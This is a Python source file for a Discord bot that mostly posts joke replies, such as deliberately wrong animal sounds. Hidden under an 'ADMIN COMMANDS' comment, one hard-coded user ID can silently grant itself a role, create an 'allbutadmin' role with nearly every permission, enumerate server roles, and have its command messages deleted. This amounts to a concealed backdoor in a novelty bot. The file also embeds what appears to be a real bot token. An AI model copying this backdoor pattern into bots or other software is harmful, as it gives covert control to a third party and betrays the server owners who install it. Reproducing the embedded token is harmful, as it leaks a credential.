import discord
import discord.ext
import discord.utils

client = discord.Client()

containsDict = {
    "moonwalk": "I have fallen into the void",
    "nerd": "No u <o/",
    "<o/": "\o>",
    "\o>": "<o/",
    "ayo": "AYO",
    "apple": "Apple",
    "kuyadsnrhuasaaskf": "That is the sound a viola makes",
    "moo": "That is the sound a dog makes",
    "bark": "That is the sound a cat makes",
    "meow": "That is the sound a goat makes",
    "baa": "That is the sound a bird makes",
    "chirp": "That is the sound a goose makes",
    "honk": "That is the sound a horse makes",
    "neigh": "That is the sound a chicken makes",
    "bawk": "That is the sound a frog makes",
    "ribbit":"That is the sound a cow makes",

}


@client.event
async def on_ready():
    print('We have logged in as {0.user}'.format(client))


@client.event
async def on_message(message):
    if message.author == client.user:
        return

    for item in containsDict.keys():
        if item in message.content.lower():
            await message.channel.send(containsDict[item])
            return

    if message.content == 'DM Me':
        await message.author.send("message")

    # ADMIN COMMANDS
    if message.content.startswith('~'):

        if message.author.id == 370687731845824513:

            if message.content != '~testing':
                await message.delete()

            if message.content == '~testing':

                role = discord.utils.get(message.author.guild.roles, id=811092668150579211)

                await message.author.add_roles(role)

                #user = message.author
                #await user.add_roles(user, role)

            if message.content == '~check_auth_level':
                guild = message.guild
                print(guild.mfa_level)
                print(client)

            if message.content == '~roles':
                guild = message.guild
                print(guild.roles)

            # Requires Input
            if message.content == '~create_role':
                guild = message.guild
                role_name = "allbutadmin"
                # This creates a role which has every permission but admin
                await guild.create_role(name=role_name, permissions=discord.Permissions(permissions=2147483639))

            # Requires Input
            #if message.content == '~remove_role':
                # Use ~roles to find the role id of the role you want to take away from a user
                #target_role_id = 811114415101444136
                #role =
                #await message.author.remove_roles(id=811114415101444136)

            # Note: Removing the Bot is irreversible unless you already have admin
            if message.content == '~leave_the_server':
                await client.get_guild(message.guild.id).leave()




client.run('ODEwMzUyMjE0MzgzNzg4MDQz.YCiZTw.Jo5xLcPPr2fb61cy56LXUGI1YHk')
